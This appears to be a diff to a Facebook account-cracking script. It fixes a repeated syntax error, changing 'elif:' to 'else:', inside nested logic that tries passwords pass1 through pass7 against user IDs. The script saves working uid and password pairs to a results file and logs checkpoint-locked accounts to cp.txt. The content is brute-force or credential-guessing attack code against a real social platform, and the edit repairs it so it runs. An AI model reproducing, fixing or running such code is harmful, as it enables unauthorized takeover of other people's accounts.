@@ -354,7 +354,7 @@ def b_menu_select():
 		        ok.write(uid+" | "+pass1+"\n")
 		        ok.close()
 		        oks.append(uid + pass1)
-		    elif:
+		    else:
 		    	if 'www.facebook.com' in d['error_msg']:
 		            print("\x1b[1;93m[SANI-CP] "+uid+" | "+pass1+" | "+name)
 		            cp=open("cp.txt","a")
@@ -371,7 +371,7 @@ def b_menu_select():
 		                ok.write(uid+" | "+pass2+"\n")
 		                ok.close()
 		                oks.append(uid + pass2)
-		            elif:
+		            else:
 		    	        if 'www.facebook.com' in d['error_msg']:
 		                    print("\x1b[1;93m[SANI-CP] "+uid+" | "+pass2+" | "+name)
 		                    cp=open("cp.txt","a")
@@ -388,7 +388,7 @@ def b_menu_select():
 		                        ok.write(uid+" | "+pass3+"\n")
 		                        ok.close()
 		                        oks.append(uid + pass3)
-		                    elif:
+		                    else:
 		    	                if 'www.facebook.com' in d['error_msg']:
 		                            print("\x1b[1;93m[SANI-CP] "+uid+" | "+pass3+" | "+name)
 		                            cp=open("cp.txt","a")
@@ -405,7 +405,7 @@ def b_menu_select():
 		                                ok.write(uid+" | "+pass4+"\n")
 		                                ok.close()
 		                                oks.append(uid + pass4)
-		                            elif:
+		                            else:
 		    	                        if 'www.facebook.com' in d['error_msg']:
 		                                    print("\x1b[1;93m[SANI-CP] "+uid+" | "+pass4+" | "+name)
 		                                    cp=open("cp.txt","a")
@@ -422,7 +422,7 @@ def b_menu_select():
 		                                        ok.write(uid+" | "+pass5+"\n")
 		                                        ok.close()
 		                                        oks.append(uid + pass5)
-		                                    elif:
+		                                    else:
 		    	                                if 'www.facebook.com' in d['error_msg']:
 		                                            print("\x1b[1;93m[SANI-CP] "+uid+" | "+pass5+" | "+name)
 		                                            cp=open("cp.txt","a")
@@ -439,7 +439,7 @@ def b_menu_select():
 		                                                ok.write(uid+" | "+pass6+"\n")
 		                                                ok.close()
 		                                                oks.append(uid + pass6)
-		                                            elif:
+		                                            else:
 		    	                                        if 'www.facebook.com' in d['error_msg']:
 		                                                    print("\x1b[1;93m[SANI-CP] "+uid+" | "+pass6+" | "+name)
 		                                                    cp=open("cp.txt","a")
@@ -456,7 +456,7 @@ def b_menu_select():
 		                                                        ok.write(uid+" | "+pass7+"\n")
 		                                                        ok.close()
 		                                                        oks.append(uid + pass7)
-		                                                    elif:
+		                                                    else:
 		    	                                                if 'www.facebook.com' in d['error_msg']:
 		                                                            print("\x1b[1;93m[SANI-CP] "+uid+" | "+pass7+" | "+name)
 		                                                            cp=open("cp.txt","a")
